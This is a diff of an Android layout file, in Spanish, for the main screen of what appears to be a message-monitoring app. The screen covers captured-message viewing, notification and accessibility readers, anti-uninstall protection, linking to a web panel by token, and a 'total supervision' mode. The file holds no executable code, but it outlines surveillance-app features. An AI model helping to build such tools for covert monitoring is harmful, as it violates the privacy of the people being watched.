@@ -3,35 +3,205 @@
     xmlns:app="http://schemas.android.com/apk/res-auto"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#F3F4F6">
+    android:background="#F8FAFC">
 
     <LinearLayout
         android:orientation="vertical"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:padding="24dp">
+        android:padding="20dp">
 
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="Control de Sincronización"
+            android:text="Estado del Sistema"
             android:textSize="22sp"
             android:textStyle="bold"
-            android:textColor="#111827"
+            android:textColor="#0F172A"
             android:layout_marginBottom="24dp" />
 
-        <!-- Banner de Advertencia de Permisos (Visible solo si falta permiso) -->
+        <!-- Tarjeta de Estado Principal -->
         <com.google.android.material.card.MaterialCardView
-            android:id="@+id/card_permission_warning"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="20dp"
-            app:cardCornerRadius="12dp"
-            app:cardElevation="0dp"
-            app:strokeWidth="1dp"
-            app:strokeColor="#FECACA"
-            app:cardBackgroundColor="#FEF2F2"
-            android:visibility="gone">
+            android:layout_marginBottom="24dp"
+            app:cardCornerRadius="16dp"
+            app:cardElevation="4dp"
+            app:cardBackgroundColor="#FFFFFF">
+
+            <LinearLayout
+                android:orientation="vertical"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:padding="16dp">
+
+                <TextView
+                    android:id="@+id/tv_status_main"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="● Monitoreo Activo"
+                    android:textColor="#10B981"
+                    android:textStyle="bold"
+                    android:textSize="18sp" />
+
+                <TextView
+                    android:id="@+id/tv_last_activity"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="Última actividad: Sin registros"
+                    android:textColor="#64748B"
+                    android:textSize="12sp"
+                    android:layout_marginTop="4dp" />
+
+                <Button
+                    android:id="@+id/btn_view_logs"
+                    android:layout_width="match_parent"
+                    android:layout_height="60dp"
+                    android:layout_marginTop="16dp"
+                    android:text="VER MENSAJES CAPTURADOS"
+                    android:backgroundTint="#10B981"
+                    android:textStyle="bold"
+                    app:icon="@android:drawable/ic_menu_agenda" />
+            </LinearLayout>
+        </com.google.android.material.card.MaterialCardView>
+
+        <!-- Lista de Verificación de Permisos -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Configuración Requerida"
+            android:textStyle="bold"
+            android:textColor="#475569"
+            android:textSize="14sp"
+            android:layout_marginBottom="12dp" />
+
+        <!-- Permiso 1: Notificaciones -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical"
+            android:background="@android:color/white"
+            android:padding="12dp"
+            android:layout_marginBottom="8dp">
+
+            <TextView
+                android:id="@+id/tv_status_notif_icon"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="✅"
+                android:textSize="18sp" />
+
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Lector de Notificaciones"
+                android:textColor="#1E293B"
+                android:layout_marginStart="12dp" />
+
+            <Button
+                android:id="@+id/btn_fix_notif"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Reparar"
+                style="@style/Widget.Material3.Button.TextButton" />
+        </LinearLayout>
+
+        <!-- Permiso 2: Accesibilidad -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical"
+            android:background="@android:color/white"
+            android:padding="12dp"
+            android:layout_marginBottom="8dp">
+
+            <TextView
+                android:id="@+id/tv_status_acc_icon"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="✅"
+                android:textSize="18sp" />
+
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Lector de Respaldo"
+                android:textColor="#1E293B"
+                android:layout_marginStart="12dp" />
+
+            <Button
+                android:id="@+id/btn_fix_acc"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Reparar"
+                style="@style/Widget.Material3.Button.TextButton" />
+        </LinearLayout>
+
+        <!-- Permiso 3: Anti-Borrado -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical"
+            android:background="@android:color/white"
+            android:padding="12dp"
+            android:layout_marginBottom="8dp">
+
+            <TextView
+                android:id="@+id/tv_status_admin_icon"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="⚠️"
+                android:textSize="18sp" />
+
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Protección contra borrado"
+                android:textColor="#1E293B"
+                android:layout_marginStart="12dp" />
+        </LinearLayout>
+
+        <!-- Permiso 4: Token -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical"
+            android:background="@android:color/white"
+            android:padding="12dp"
+            android:layout_marginBottom="8dp">
+
+            <TextView
+                android:id="@+id/tv_status_token_icon"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="⚠️"
+                android:textSize="18sp" />
+
+            <TextView
+                android:layout_width="0dp"
+                android:layout_weight="1"
+                android:layout_height="wrap_content"
+                android:text="Vinculación con el Panel"
+                android:textColor="#1E293B"
+                android:layout_marginStart="12dp" />
+        </LinearLayout>
+
+        <!-- Gestión de Token y Seguridad -->
+        <com.google.android.material.card.MaterialCardView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="16dp"
+            android:layout_marginBottom="24dp"
+            app:cardCornerRadius="16dp"
+            app:cardElevation="2dp"
+            app:cardBackgroundColor="#FFFFFF">
 
             <LinearLayout
                 android:orientation="vertical"
@@ -42,39 +212,65 @@
                 <TextView
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="⚠️ Permisos Bloqueados"
-                    android:textColor="#991B1B"
+                    android:text="Gestión de Enlace"
+                    android:textColor="#1E293B"
                     android:textStyle="bold"
                     android:textSize="16sp" />
 
-                <TextView
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="Android 13+ ha restringido el acceso a notificaciones. Debe desbloquearlo manualmente."
-                    android:textColor="#B91C1C"
-                    android:textSize="13sp"
-                    android:layout_marginTop="4dp" />
-
-                <Button
-                    android:id="@+id/btn_help_permission"
+                <com.google.android.material.textfield.TextInputLayout
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
                     android:layout_marginTop="12dp"
-                    android:text="VER CÓMO DESBLOQUEAR"
-                    android:backgroundTint="#EF4444"
-                    android:textColor="@android:color/white"
-                    style="@style/Widget.Material3.Button.TonalButton" />
+                    style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox.Dense">
+
+                    <com.google.android.material.textfield.TextInputEditText
+                        android:id="@+id/et_token_edit"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:hint="Token del Panel Web"
+                        android:inputType="textNoSuggestions"
+                        android:textSize="14sp" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+                <Button
+                    android:id="@+id/btn_save_token"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    style="?attr/borderlessButtonStyle"
+                    android:text="ACTUALIZAR TOKEN"
+                    android:textColor="#4F46E5"
+                    android:layout_gravity="end" />
+
+                <View
+                    android:layout_width="match_parent"
+                    android:layout_height="1dp"
+                    android:background="#F1F5F9"
+                    android:layout_marginVertical="12dp" />
+
+                <com.google.android.material.materialswitch.MaterialSwitch
+                    android:id="@+id/sw_total_supervision"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:text="Modo Supervisión Total"
+                    android:textSize="14sp" />
+
+                <Button
+                    android:id="@+id/btn_admin"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="12dp"
+                    android:text="CONFIGURAR ANTI-BORRADO"
+                    android:backgroundTint="#EF4444" />
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
-        <!-- Sección de Optimización por Marca (Detección Automática) -->
+        <!-- Optimización por Marca -->
         <com.google.android.material.card.MaterialCardView
             android:id="@+id/card_brand_optimization"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginBottom="20dp"
+            android:layout_marginBottom="24dp"
             app:cardCornerRadius="12dp"
-            app:cardElevation="2dp"
             app:strokeWidth="1dp"
             app:strokeColor="#DBEAFE"
             app:cardBackgroundColor="#EFF6FF">
@@ -89,186 +285,99 @@
                     android:id="@+id/tv_brand_title"
                     android:layout_width="wrap_content"
                     android:layout_height="wrap_content"
-                    android:text="Optimización para su dispositivo"
+                    android:text="Optimización por Marca"
                     android:textColor="#1E40AF"
-                    android:textStyle="bold"
-                    android:textSize="16sp" />
-
-                <TextView
-                    android:id="@+id/tv_brand_guide"
-                    android:layout_width="wrap_content"
-                    android:layout_height="wrap_content"
-                    android:text="Siga los pasos para evitar que el sistema detenga el monitoreo."
-                    android:textColor="#1E3A8A"
-                    android:textSize="13sp"
-                    android:layout_marginTop="4dp" />
+                    android:textStyle="bold" />
 
                 <Button
                     android:id="@+id/btn_brand_settings"
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
                     android:layout_marginTop="12dp"
-                    android:text="ABRIR AJUSTES ESPECIALES"
-                    android:backgroundTint="#3B82F6"
-                    android:textColor="@android:color/white"
-                    style="@style/Widget.Material3.Button.TonalButton" />
+                    android:text="CONFIGURAR BATERÍA"
+                    android:backgroundTint="#3B82F6" />
             </LinearLayout>
         </com.google.android.material.card.MaterialCardView>
 
-        <!-- Interruptor Maestro -->
-        <com.google.android.material.materialswitch.MaterialSwitch
-            android:id="@+id/sw_monitoring"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="Monitoreo en tiempo real"
-            android:textSize="16sp"
-            android:checked="true"
-            android:padding="12dp"
-            android:background="@android:color/white" />
-
-        <TextView
-            android:id="@+id/tv_status"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:textSize="14sp"
-            android:textColor="#6B7280"
-            android:text="Cargando estado..." />
-
-        <TextView
-            android:id="@+id/tv_last_activity"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="4dp"
-            android:textSize="11sp"
-            android:textColor="#9CA3AF"
-            android:text="Última actividad: Sin registros" />
-
-        <!-- Modo de Supervisión Total -->
-        <com.google.android.material.materialswitch.MaterialSwitch
-            android:id="@+id/sw_total_supervision"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="16dp"
-            android:text="Modo Supervisión Total (Enviar Todo)"
-            android:textSize="15sp"
-            android:padding="12dp"
-            android:background="@android:color/white"
-            app:useMaterialThemeColors="true" />
-
-        <TextView
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="Use este modo solo para pruebas. Enviará todos los mensajes al panel, ignorando filtros."
-            android:textColor="#6B7280"
-            android:textSize="12sp"
-            android:layout_marginTop="4dp" />
-
-        <!-- Token Editable -->
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text="Token de Vinculación:"
-            android:textStyle="bold"
-            android:layout_marginTop="32dp" />
-
-        <com.google.android.material.textfield.TextInputLayout
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox">
-
-            <com.google.android.material.textfield.TextInputEditText
-                android:id="@+id/et_token_edit"
-                android:layout_width="match_parent"
-                android:layout_height="wrap_content"
-                android:hint="Token"
-                android:inputType="textNoSuggestions"
-                android:fontFamily="monospace" />
-        </com.google.android.material.textfield.TextInputLayout>
-
+        <!-- Ajustes Adicionales -->
         <Button
-            android:id="@+id/btn_save_token"
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            style="?attr/borderlessButtonStyle"
-            android:text="GUARDAR TOKEN"
-            android:textColor="#4F46E5"
-            android:layout_gravity="end" />
-
-        <!-- Pruebas y Seguridad -->
-        <Button
-            android:id="@+id/btn_view_logs"
+            android:id="@+id/btn_select_apps"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginTop="32dp"
-            android:text="VER MENSAJES CAPTURADOS"
-            android:backgroundTint="#10B981"
-            app:icon="@android:drawable/ic_menu_agenda" />
-
-        <Button
-            android:id="@+id/btn_test"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="16dp"
-            android:text="ENVIAR SEÑAL DE PRUEBA"
-            android:backgroundTint="#4F46E5" />
-
-        <Button
-            android:id="@+id/btn_admin"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="16dp"
-            android:text="CONFIGURAR ANTI-BORRADO"
-            android:backgroundTint="#EF4444" />
-
-        <Button
-            android:id="@+id/btn_disable"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="16dp"
-            android:text="AJUSTES DE NOTIFICACIONES"
-            style="?attr/materialButtonOutlinedStyle" />
-
-        <Button
-            android:id="@+id/btn_accessibility"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="ACTIVAR LECTOR DE RESPALDO"
-            style="?attr/materialButtonOutlinedStyle" />
-
-        <Button
-            android:id="@+id/btn_refresh_service"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="REINICIAR LECTOR (Si falla)"
-            style="?attr/materialButtonOutlinedStyle" />
-
-        <Button
-            android:id="@+id/btn_app_info"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="INFORMACIÓN DE LA APP (3 PUNTOS ⋮)"
-            style="?attr/materialButtonOutlinedStyle" />
-
-        <Button
-            android:id="@+id/btn_battery"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="OPTIMIZACIÓN DE BATERÍA"
-            style="?attr/materialButtonOutlinedStyle" />
+            android:text="Apps a Monitorear"
+            style="@style/Widget.Material3.Button.TonalButton"
+            android:layout_marginBottom="12dp" />
 
         <Button
             android:id="@+id/btn_contacts"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:layout_marginTop="8dp"
-            android:text="PERMISO DE CONTACTOS (PRIVACIDAD)"
-            style="?attr/materialButtonOutlinedStyle" />
+            android:text="Permiso de Privacidad (Contactos)"
+            style="@style/Widget.Material3.Button.TonalButton"
+            android:layout_marginBottom="8dp" />
+
+        <com.google.android.material.materialswitch.MaterialSwitch
+            android:id="@+id/sw_monitoring"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="Pausar Monitoreo"
+            android:padding="12dp" />
+
+        <!-- Sección de Ayuda -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Ayuda y Soporte"
+            android:textSize="14sp"
+            android:textStyle="bold"
+            android:textColor="#475569"
+            android:layout_marginTop="32dp"
+            android:layout_marginBottom="12dp" />
+
+        <Button
+            android:id="@+id/btn_help_permission"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="GUÍA AJUSTES RESTRINGIDOS (Android 13+)"
+            style="@style/Widget.Material3.Button.TextButton" />
+
+        <Button
+            android:id="@+id/btn_app_info"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="INFORMACIÓN DE LA APLICACIÓN"
+            style="@style/Widget.Material3.Button.TextButton" />
+
+        <Button
+            android:id="@+id/btn_battery"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="AJUSTES DE ENERGÍA"
+            style="@style/Widget.Material3.Button.TextButton" />
+
+        <!-- Herramientas de Diagnóstico -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="Diagnóstico"
+            android:textSize="12sp"
+            android:textColor="#94A3B8"
+            android:layout_marginTop="24dp"
+            android:layout_marginBottom="12dp" />
+
+        <Button
+            android:id="@+id/btn_test"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="ENVIAR SEÑAL DE PRUEBA"
+            style="@style/Widget.Material3.Button.TextButton" />
+
+        <Button
+            android:id="@+id/btn_refresh_service"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:text="REINICIAR SERVICIOS"
+            style="@style/Widget.Material3.Button.TextButton" />
 
     </LinearLayout>
 </ScrollView>
